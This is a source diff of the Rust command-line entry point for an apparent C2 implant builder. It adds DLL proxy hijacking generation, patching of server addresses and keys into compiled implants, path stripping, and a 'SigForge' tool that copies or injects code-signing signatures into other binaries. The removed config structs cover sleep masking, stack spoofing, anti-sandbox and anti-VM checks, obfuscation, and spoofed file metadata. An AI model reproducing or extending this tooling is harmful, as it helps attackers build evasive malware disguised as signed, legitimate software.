@@ -1,7 +1,7 @@
 #[allow(deprecated)]
 #[macro_use]
 extern crate lazy_static;
-use clap::{Parser, ValueEnum};
+use clap::Parser;
 use cmd::SrdiType;
 use generate::{
     update_beacon_config, update_bind_config, update_common_config, update_prelude_config,
@@ -10,283 +10,24 @@ use generate::{
 
 use build::*;
 use jsonschema::Validator;
-use serde::{Deserialize, Serialize};
 use serde_json::Value as JsonValue;
 use serde_yaml::Value as YamlValue;
 
 use crate::build::payload::build_payload;
-use crate::cmd::{BuildCommands, Cli, Commands, GenerateCommands, PayloadType, Tool};
-use crate::generate::{detect_source_mode, update_workspace_members};
-use std::collections::HashMap;
-use std::{fs, process};
+use crate::cmd::{
+    BuildCommands, Cli, Commands, GenerateCommands, PayloadType, SigForgeCommands, Tool,
+};
+use crate::tool::sigforge::SignatureRemover;
+use config::{Implant, Version};
+use std::{fs, path::Path, process};
 use strum_macros::{Display, EnumString};
 
 mod build;
 mod cmd;
+mod config;
 mod generate;
 mod logger;
 mod tool;
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct Implant {
-    basic: BasicConfig,
-    implants: ImplantConfig,
-    pulse: Option<PulseConfig>,
-    build: Option<BuildConfig>,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct BasicConfig {
-    name: String,
-    targets: Vec<String>,
-    protocol: String,
-    tls: TLSConfig,
-    proxy: String,
-    interval: u64,
-    jitter: f64,
-    encryption: String,
-    key: String,
-    rem: REMConfig,
-    http: HttpConfig,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct TLSConfig {
-    enable: bool,
-    /// TLS版本: "auto", "1.2", "1.3"
-    #[serde(default = "default_tls_version")]
-    version: String,
-    /// 服务器名称指示（SNI）
-    #[serde(default)]
-    sni: String,
-    #[serde(default)]
-    skip_verification: bool,
-    /// mTLS客户端证书配置
-    #[serde(default)]
-    mtls: Option<MTLSConfig>,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct MTLSConfig {
-    /// 启用mTLS
-    enable: bool,
-    /// 客户端证书文件路径
-    client_cert: String,
-    /// 客户端私钥文件路径
-    client_key: String,
-    /// 用于验证服务端的CA证书路径（可选）
-    #[serde(default)]
-    server_ca: String,
-}
-
-// 默认值函数
-fn default_tls_version() -> String {
-    "auto".to_string()
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct BuildConfig {
-    zigbuild: bool,
-    ollvm: Ollvm,
-    metadata: Option<MetaData>,
-    
-    #[serde(rename = "remap")]
-    refresh_remap_path_prefix: bool,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct Ollvm {
-    enable: bool,
-    bcfobf: bool,
-    splitobf: bool,
-    subobf: bool,
-    fco: bool,
-    constenc: bool,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct PulseConfig {
-    flags: Flags,
-    target: String,
-    protocol: String,
-    encryption: String,
-    key: String,
-    http: HttpConfig,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct REMConfig {
-    link: String,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct HttpConfig {
-    method: String,
-    path: String,
-    host: String,
-    version: String,
-    headers: HashMap<String, String>,
-}
-
-impl HttpConfig {
-    pub fn build(self, length: u32) -> String {
-        let mut http_request = format!("{} {} HTTP/{}\r\n", self.method, self.path, self.version);
-
-        http_request.push_str(&format!("Host: {}\r\n", self.host));
-        if length > 0 {
-            http_request.push_str(&format!("Content-Length: {length}\r\n"));
-        }
-        http_request.push_str("Connection: close\r\n");
-        for (key, value) in self.headers.clone() {
-            http_request.push_str(&format!("{}: {}\r\n", key, value));
-        }
-
-        http_request.to_string()
-    }
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct PackResource {
-    src: String,
-    dst: String,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct ImplantConfig {
-    runtime: String,
-    r#mod: String,
-    register_info: bool,
-    hot_load: bool,
-    modules: Vec<String>,
-    enable_3rd: bool,
-    #[serde(rename = "3rd_modules")]
-    third_modules: Vec<String>,
-    flags: Flags,
-    apis: Apis,
-    alloctor: Alloctor,
-    sleep_mask: bool,
-    sacrifice_process: bool,
-    fork_and_run: bool,
-    hook_exit: bool,
-    thread_stack_spoofer: bool,
-    pe_signature_modify: PESignatureModify,
-    #[serde(default)]
-    pack: Option<Vec<PackResource>>,
-    autorun: String,
-    #[serde(default)]
-    anti: Option<AntiConfig>,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct Flags {
-    start: u32, // Acutally it's a u8
-    end: u32,   // Actually it's a u8
-    magic: String,
-    artifact_id: u32,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct Apis {
-    level: String,
-    priority: ApisPriority,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct ApisPriority {
-    normal: NormalPriority,
-    dynamic: DynamicPriority,
-    syscalls: SyscallPriority,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct NormalPriority {
-    enable: bool,
-    r#type: String,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct DynamicPriority {
-    enable: bool,
-    r#type: String,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct SyscallPriority {
-    enable: bool,
-    r#type: String,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct Alloctor {
-    inprocess: String,
-    crossprocess: String,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct MetaData {
-    remap_path: String,
-    icon: String,
-    compile_time: String,
-    file_version: String,
-    product_version: String,
-    company_name: String,
-    product_name: String,
-    original_filename: String,
-    file_description: String,
-    internal_name: String,
-    #[serde(default)]
-    require_admin: bool,
-    #[serde(default)]
-    require_uac: bool,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct PESignatureModify {
-    feature: bool,
-    modify: PESModify,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct PESModify {
-    magic: String,
-    signature: String,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-struct AntiConfig {
-    #[serde(default)]
-    sandbox: bool,
-    #[serde(default)]
-    vm: bool,
-}
-
-#[derive(Debug, Clone, Copy, EnumString, Display, ValueEnum)]
-pub enum Version {
-    #[strum(serialize = "community")]
-    Community,
-    #[strum(serialize = "professional")]
-    Professional,
-    #[strum(serialize = "inner")]
-    Inner,
-}
-
-#[derive(Debug, Clone, Copy, EnumString, Display)]
-pub enum GenerateArch {
-    #[strum(serialize = "x64")]
-    X64,
-    #[strum(serialize = "x86")]
-    X86,
-}
-
-#[derive(Debug, Clone, Copy, EnumString, Display)]
-pub enum TransportProtocolType {
-    #[strum(serialize = "tcp")]
-    Tcp,
-    #[strum(serialize = "http")]
-    Http,
-    // #[strum(serialize = "https")]
-    // Https,
-}
 
 #[derive(Debug, Clone, Copy, EnumString, Display)]
 pub enum Platform {
@@ -346,7 +87,11 @@ fn validate_yaml_config(yaml_path: &str) -> anyhow::Result<()> {
     let compiled_schema = Validator::new(&schema).expect("Invalid JSON Schema");
 
     if let Err(error) = compiled_schema.validate(&json_value) {
-        log_error!("Schema validation failed: {}", error);
+        log_error!(
+            "Schema validation '{}' failed: {}",
+            error.instance_path,
+            error
+        );
         process::exit(1);
     }
 
@@ -375,13 +120,13 @@ fn parse_generate(
             update_bind_config(yaml_config)
         }
         GenerateCommands::Prelude {
-            yaml_path,
+            yaml_path: prelude_yaml_path,
             resources,
             key,
             spite,
         } => {
             log_info!("Generating prelude configuration");
-            update_prelude_config(yaml_path, resources, key, spite)
+            update_prelude_config(yaml_config, prelude_yaml_path, resources, key, spite)
         }
         GenerateCommands::Modules { module } => {
             if !module.is_empty() {
@@ -398,6 +143,112 @@ fn parse_generate(
                 .clone()
                 .ok_or_else(|| anyhow::anyhow!("pulse configuration is required but not found"))?;
             pulse_generate(pulse_config, *platform, *arch, version, source)
+        }
+        GenerateCommands::ProxyDLL {
+            raw_dll,
+            proxied_dll,
+            proxy_dll,
+            hijacked_exports,
+            native_thread,
+        } => {
+            // Try to get config from yaml, command line args override config file
+            let proxydll_config = yaml_config
+                .loader
+                .as_ref()
+                .and_then(|l| l.proxydll.as_ref());
+
+            // Determine actual values (CLI args > config file)
+            let raw_dll_path = if !raw_dll.is_empty() {
+                raw_dll.clone()
+            } else if let Some(cfg) = proxydll_config {
+                cfg.raw_dll.clone()
+            } else {
+                return Err(anyhow::anyhow!(
+                    "raw_dll is required (use -r or configure in yaml)"
+                ));
+            };
+
+            let proxied_dll_path = if !proxied_dll.is_empty() {
+                proxied_dll.clone()
+            } else if let Some(cfg) = proxydll_config {
+                cfg.proxied_dll.clone()
+            } else {
+                return Err(anyhow::anyhow!(
+                    "proxied_dll is required (use -p or configure in yaml)"
+                ));
+            };
+
+            // Proxy DLL name: CLI > config > extract from proxied_dll
+            let proxy_dll_name = if let Some(out) = proxy_dll {
+                out.clone()
+            } else if let Some(cfg) = proxydll_config {
+                cfg.proxy_dll.clone().unwrap_or_else(|| {
+                    std::path::Path::new(&cfg.proxied_dll)
+                        .file_name()
+                        .and_then(|n| n.to_str())
+                        .unwrap_or(&cfg.proxied_dll)
+                        .to_string()
+                })
+            } else {
+                std::path::Path::new(&proxied_dll_path)
+                    .file_name()
+                    .and_then(|n| n.to_str())
+                    .unwrap_or(&proxied_dll_path)
+                    .to_string()
+            };
+
+            let hijacked_funcs = if !hijacked_exports.is_empty() {
+                hijacked_exports.clone()
+            } else if let Some(cfg) = proxydll_config {
+                cfg.proxyfunc.clone()
+            } else {
+                String::new()
+            };
+
+            let use_native_thread =
+                *native_thread || proxydll_config.map_or(false, |c| c.native_thread);
+            let use_block = proxydll_config.map_or(false, |c| c.block);
+            let _resource_dir = proxydll_config
+                .map(|c| c.resource_dir.clone())
+                .unwrap_or_else(|| "resources/proxydll".to_string());
+            let _pack_resources = proxydll_config.map_or(false, |c| c.pack_resources);
+
+            // Use implant.prelude configuration to determine if prelude should be enabled
+            // Clone the prelude path to avoid borrow issues
+            let prelude_path = yaml_config.implants.prelude.clone();
+            let use_prelude = !prelude_path.is_empty();
+
+            // Generate spites if prelude is configured
+            if use_prelude {
+                log_step!("Generating spites for ProxyDLL prelude...");
+                update_prelude_config(
+                    yaml_config,
+                    &prelude_path,
+                    "resources",
+                    "maliceofinternal",
+                    "spite.bin",
+                )?;
+            }
+
+            log_info!("Generating ProxyDLL for {}", raw_dll_path);
+            let exports: Vec<&str> = if hijacked_funcs.is_empty() {
+                Vec::new()
+            } else {
+                hijacked_funcs.split(',').map(|s| s.trim()).collect()
+            };
+
+            // Generate the proxy DLL
+            tool::proxydll::generator::update_proxydll(
+                &raw_dll_path,
+                &proxied_dll_path,
+                &proxy_dll_name,
+                &exports,
+                use_native_thread,
+                use_block,
+                use_prelude,
+            )?;
+
+            Ok(())
         }
     };
 
@@ -451,6 +302,9 @@ fn parse_build(config: &mut Implant, build: &BuildCommands, target: &String) -> 
         }
         BuildCommands::Pulse => build_payload(build_config, &PayloadType::PULSE, target, None),
         BuildCommands::Prelude => build_payload(build_config, &PayloadType::PRELUDE, target, None),
+        BuildCommands::ProxyDll => {
+            build_payload(build_config, &PayloadType::PROXYDLL, target, None)
+        }
     };
     result
 }
@@ -511,7 +365,259 @@ fn parse_tool(tool: &Tool) -> anyhow::Result<()> {
             }
             result
         }
+        Tool::STRIP {
+            input,
+            output,
+            custom_paths,
+        } => {
+            use crate::tool::strip::strip_paths_from_binary;
+
+            log_step!("Stripping paths from binary...");
+            log_info!("Input: {}, Output: {}", input, output);
+
+            let custom_path_list: Vec<String> = if custom_paths.is_empty() {
+                Vec::new()
+            } else {
+                custom_paths
+                    .split(',')
+                    .map(|s| s.trim().to_string())
+                    .collect()
+            };
+
+            if !custom_path_list.is_empty() {
+                log_info!("Custom paths: {:?}", custom_path_list);
+            }
+
+            let result = strip_paths_from_binary(input, output, &custom_path_list);
+
+            if result.is_ok() {
+                log_success!("Path stripping completed successfully");
+            }
+            result
+        }
+        Tool::OBJCOPY {
+            output_format,
+            input,
+            output,
+        } => {
+            use crate::tool::pe::PEObjCopy;
+
+            log_step!("Converting binary file...");
+            log_info!(
+                "Input: {}, Output: {}, Format: {}",
+                input,
+                output,
+                output_format
+            );
+
+            let result = match output_format.as_str() {
+                "binary" => PEObjCopy::extract_binary(input, output),
+                _ => {
+                    log_error!("Unsupported output format: {}", output_format);
+                    log_info!("Supported formats: binary");
+                    Err(anyhow::anyhow!(
+                        "Unsupported output format: {}",
+                        output_format
+                    ))
+                }
+            };
+
+            if result.is_ok() {
+                log_success!("Binary conversion completed successfully");
+            }
+            result
+        }
+        Tool::SigForge { command } => parse_sigforge(command),
+        Tool::Patch {
+            file,
+            name,
+            key,
+            server_address,
+            output,
+            xor_key,
+        } => {
+            use crate::tool::patch::{
+                batch_patch_binary, BatchPatchOptions, FieldPatch, PatchField,
+            };
+
+            // Collect patches
+            let mut patches = Vec::new();
+
+            let resolved_xor_key = resolve_patch_xor_key(xor_key.as_deref())?;
+            let xor_key_bytes = resolved_xor_key.as_bytes().to_vec();
+
+            if let Some(name_val) = name {
+                patches.push(FieldPatch {
+                    field: PatchField::Name,
+                    value: name_val.clone(),
+                    is_hex: false,
+                    default_value: None,
+                });
+            }
+
+            if let Some(key_val) = key {
+                patches.push(FieldPatch {
+                    field: PatchField::Key,
+                    value: key_val.clone(),
+                    is_hex: false,
+                    default_value: Some(resolved_xor_key.clone()),
+                });
+            }
+
+            if let Some(addr) = server_address {
+                patches.push(FieldPatch {
+                    field: PatchField::ServerAddress,
+                    value: addr.clone(),
+                    is_hex: false,
+                    default_value: None,
+                });
+            }
+
+            if patches.is_empty() {
+                log_error!("No fields specified to patch. Use --name, --key, or --server-address");
+                return Err(anyhow::anyhow!("no fields specified for patching"));
+            }
+
+            log_step!("Patching {} field(s) in {}", patches.len(), file);
+            for patch in &patches {
+                log_info!("  {} = {}", patch.field.label(), patch.value);
+            }
+
+            let options = BatchPatchOptions {
+                file: file.clone(),
+                patches,
+                output: output.clone(),
+                xor_key: xor_key_bytes,
+            };
+
+            let outcome = batch_patch_binary(&options)?;
+            let overwritten = outcome.output_path == std::path::PathBuf::from(file);
+
+            log_success!(
+                "Successfully patched {} field(s)",
+                outcome.patched_fields.len()
+            );
+            for (field, offset) in &outcome.patched_fields {
+                log_info!(
+                    "  {} at offset 0x{:X} ({} decimal)",
+                    field.label(),
+                    offset,
+                    offset
+                );
+            }
+
+            if overwritten {
+                log_info!("Original file overwritten in-place");
+            } else {
+                log_info!("Patched file written to {}", outcome.output_path.display());
+            }
+            Ok(())
+        }
     }
+}
+
+fn parse_sigforge(command: &SigForgeCommands) -> anyhow::Result<()> {
+    use crate::tool::sigforge::{SignatureExtractor, SignatureInjector};
+
+    match command {
+        SigForgeCommands::Extract { input, output } => {
+            log_step!("Extracting signature from {}", input);
+
+            let signature = SignatureExtractor::extract_from_file(&input)?;
+
+            let output_path = output
+                .as_ref()
+                .map(|s| s.clone())
+                .unwrap_or_else(|| format!("{}_sig", input));
+            SignatureExtractor::save_signature_to_file(&signature, &output_path)?;
+
+            log_success!("Signature extracted to: {}", output_path);
+            log_info!("Signature size: {} bytes", signature.len());
+            Ok(())
+        }
+
+        SigForgeCommands::Copy {
+            source,
+            target,
+            output,
+        } => {
+            log_step!("Copying signature from {} to {}", source, target);
+
+            let output_path =
+                SignatureInjector::copy_signature(&source, &target, output.as_deref())?;
+
+            log_success!("Signature copied to: {}", output_path);
+            Ok(())
+        }
+
+        SigForgeCommands::Inject {
+            signature,
+            target,
+            output,
+        } => {
+            log_step!("Injecting signature from {} into {}", signature, target);
+
+            let output_path =
+                SignatureInjector::inject_from_file(&signature, &target, output.as_deref())?;
+
+            log_success!("Signature injected to: {}", output_path);
+            Ok(())
+        }
+
+        SigForgeCommands::Remove { input, output } => {
+            log_step!("Removing signature from {}", input);
+
+            let _output_path = output
+                .as_ref()
+                .map(|s| s.clone())
+                .unwrap_or_else(|| format!("{}_unsigned", input));
+
+            let output_path = SignatureRemover::remove_signature(&input, output.as_deref())?;
+
+            log_info!("Signature removal functionality to be implemented");
+            log_success!("Signature removed, output: {}", output_path);
+            Ok(())
+        }
+        SigForgeCommands::Check { input } => {
+            let is_signed = SignatureExtractor::check_if_signed(&input)?;
+
+            if is_signed {
+                log_success!("File {} is signed", input);
+            } else {
+                log_success!("File {} is not signed", input);
+            }
+            Ok(())
+        }
+    }
+}
+
+fn resolve_patch_xor_key(cli_value: Option<&str>) -> anyhow::Result<String> {
+    if let Some(value) = cli_value {
+        return Ok(value.to_string());
+    }
+
+    if let Some(key) = read_key_from_implant_yaml()? {
+        if !key.is_empty() {
+            return Ok(key);
+        }
+    }
+
+    Ok("maliceofinternal".to_string())
+}
+
+fn read_key_from_implant_yaml() -> anyhow::Result<Option<String>> {
+    let path = Path::new("implant.yaml");
+    if !path.exists() {
+        return Ok(None);
+    }
+
+    let yaml_content = fs::read_to_string(path)?;
+    let yaml_value: YamlValue = serde_yaml::from_str(&yaml_content)?;
+    Ok(yaml_value
+        .get("basic")
+        .and_then(|basic| basic.get("key"))
+        .and_then(|key| key.as_str())
+        .map(|value| value.to_string()))
 }
 
 fn main() -> anyhow::Result<()> {
@@ -522,12 +628,11 @@ fn main() -> anyhow::Result<()> {
             version,
             config,
             command,
+            source,
         } => {
             let mut implant_config = load_yaml_config(config)?;
             validate_yaml_config(config)?;
-            let source = detect_source_mode();
-            update_workspace_members(source)?;
-            parse_generate(&mut implant_config, command, *version, source)
+            parse_generate(&mut implant_config, command, *version, *source)
         }
         Commands::Build {
             config,
